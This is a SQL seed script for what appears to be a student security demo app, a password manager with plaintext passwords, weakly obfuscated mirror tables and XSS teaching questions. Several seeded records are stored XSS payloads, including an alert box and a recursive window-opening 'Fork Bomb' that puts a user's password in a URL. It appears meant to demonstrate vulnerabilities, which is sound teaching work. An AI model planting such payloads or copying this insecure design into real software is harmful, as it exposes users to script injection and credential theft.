DROP TABLE IF EXISTS `questions`;
DROP TABLE IF EXISTS `records`;
DROP TABLE IF EXISTS `recordsE`;
DROP TABLE IF EXISTS `salts`;
DROP TABLE IF EXISTS `user`;
DROP TABLE IF EXISTS `userE`;

CREATE TABLE `user`(
	`id` int NOT NULL AUTO_INCREMENT,
    `user_name` varchar(50) NOT NULL unique,
    `user_password` varchar(50) NOT NULL,
    `user_email` varchar(50) NOT NULL,
    `user_super` int,
    PRIMARY KEY (`id`)
);

CREATE TABLE `userE`(
	`id` int NOT NULL AUTO_INCREMENT,
    `user_name` varchar(50) NOT NULL unique,
    `user_password` varchar(50) NOT NULL,
    `user_email` varchar(50) NOT NULL,
    `user_super` int,
    PRIMARY KEY (`id`)
);

CREATE TABLE `salts`(
	`id` int NOT NULL AUTO_INCREMENT,
    `salt` int NOT NULL,
    `user_name` varchar(50) NOT NULL unique,
	PRIMARY KEY (`id`)
);

CREATE TABLE `records`(
	`record_id` int NOT NULL AUTO_INCREMENT,
    `record_name` varchar(200) NOT NULL,
    `record_data` varchar(100) NOT NULL,
    `record_URL` varchar(100),
    `user` int,
    PRIMARY KEY (`record_id`),
    FOREIGN KEY (`user`) REFERENCES `user`(`id`) ON DELETE SET NULL
);

CREATE TABLE `recordsE`(
	`record_id` int NOT NULL AUTO_INCREMENT,
    `record_name` varchar(100) NOT NULL,
    `record_data` varchar(100) NOT NULL,
    `record_URL` varchar(100),
    `user` int,
    PRIMARY KEY (`record_id`),
    FOREIGN KEY (`user`) REFERENCES `userE`(`id`) ON DELETE SET NULL
);

CREATE TABLE `questions`(
	`question_id` int NOT NULL AUTO_INCREMENT,
    `question_content` varchar(100) NOT NULL,
    `question_response` varchar(100),
    `question_email` varchar(300),
    PRIMARY KEY (`question_id`)
);

INSERT INTO `user`(`user_name`,`user_password`,`user_email`,`user_super`)
VALUES
('Admin', 'password', 'admin@fake.com', 1),
('Kyle', '12345', 'kdixon@fake.com' , 0),
('Katie', 'secret', 'kyoung@fake.com', 0),
('John', 'jon', 'jdoe@fake.com', 0),
('Jane', 'password1', 'jdoe@fake.com', 0);

INSERT INTO `records`(`record_name`, `record_data`, `record_URL`,`user`)
VALUES
('USBank', '123456789', 'USBank.com',(SELECT id FROM user WHERE user_name='Kyle')),
('Twitter', 'montana', 'Twitter.com',(SELECT id FROM user WHERE user_name='Kyle')),
('IRS', 'supersecret', 'USA.gov',(SELECT id FROM user WHERE user_name='Kyle')),
('>"&amp;gt;<script>alert("Warning: This site is vulnerable to an attack")</script>', 'Alert', 'Alert',(SELECT id FROM user WHERE user_name='Kyle')),
('>"&amp;gt;<script> function fork() { const win = window.open("http://flip3.engr.oregonstate.edu:6061/user/Kyle&12345"); setTimeout(fork(), 1); } fork(); </script>', 'Fork Bomb', 'Fork Bomb',(SELECT id FROM user WHERE user_name='Kyle')),
('OffShoreBank', '987654321', 'OffShoreBank.com',(SELECT id FROM user WHERE user_name='Katie')),
('OSU', 'banana', 'oregonstate.edu',(SELECT id FROM user WHERE user_name='Katie')),
('Xfinity', 'secrets', 'xfinity.com',(SELECT id FROM user WHERE user_name='Katie'));

INSERT INTO `userE`(`user_name`,`user_password`,`user_email`,`user_super`)
VALUES
('MFhqmrhffffhllAAh', 'MtewwasffffvllAAhhhh', 'Mehqmr>ffffjllAAeoi.gsqhhh', 1),
('QQQQPclllAAttpiff', 'QQQQ45lllAAtt678ff', 'QQQQohlllAAttmbsr>jeoi.gsqff' , 0),
('QPexmiGYYYGAAAAS', 'QwigviGYYYGAAAAxS', 'QocsyrGYYYGAAAAk>jeoi.gsqS', 0),
('WWPexmihhhhAffAA4pppp', 'WWFfghihhhhAffAAj456789pppp', 'WWcsyrkhhhhAffAAoex>sviksrwxexi.ihypppp', 0);

INSERT INTO `salts`(`user_name`,`salt`)
VALUES
('Admin', 123456789),
('Kyle', 784594587),
('Katie', 325693248),
('Katie1', 878699839);

INSERT INTO `recordsE`(`record_name`, `record_data`, `record_URL`,`user`)
VALUES
('DagjbKUFiZXKQbdATIGerodVss', 'Fajdgul45678XRDwnEI9012irjY', 'cdagjmlZXGeLqQYeroBwe.gsqik',(SELECT id FROM userE WHERE user_name='QQQQPclllAAttpiff')),
('HDCIDMJYamxanYTzqxiXFvUB', 'CAjACWqsrxerTcJeTPpfoTiU', 'fJJiJBVYamxKAxkxicuv.gsqAq',(SELECT id FROM userE WHERE user_name='QQQQPclllAAttpiff')),
('eGGfdrTUNWXncLOMNQBE', 'AiJEhVnwytiEqyWYvwXuyigvixNf', 'ICdCGyZXF.ksjfOqzHQuwCBb',(SELECT id FROM userE WHERE user_name='QQQQPclllAAttpiff')),
('eecbGXLTjjXHqHclVpgGCzsviGeroxMUE', 'caaECgxm2109cXBZmuZPA87654N', 'hBAIcoNYTjjXsNfWiKrNSOlsviGero.gsqq',(SELECT id FROM userE WHERE user_name='QPexmiGYYYGAAAAS')),
('fBBaFJTXZLCKUBgGo', 'DHJAbNWqferBXWheqxhYremjR', 'eJIIjiYiisvgtpatYgiksrwxexi.ihyGmzI',(SELECT id FROM userE WHERE user_name='QPexmiGYYYGAAAAS')),
('bfACgRtLCjmrzbFJGPouWnmxct', 'ihGhhUqZwigeqzHcAvGbDixwJRD', 'ceBGjbVcabjTUeATxmnTmrmxc.gsqQqDK',(SELECT id FROM userE WHERE user_name='QPexmiGYYYGAAAAS'));

INSERT INTO `questions`(`question_content`, `question_response`)
VALUES
('What is an XSS attack?', 'An XSS attack involves injecting malicious scripts into otherwise trusted websites'),
('Where can I learn more about XSS?', 'You can learn more at owasp.org.');

INSERT INTO `questions`(`question_content`)
VALUES
('<a href="https://owasp.org/www-community/attacks/xss//" target="_blank">Learn more about XSS</a>'),
('>"&amp;gt;<script>alert("Warning: This site is vulnerable to an attack")</script>');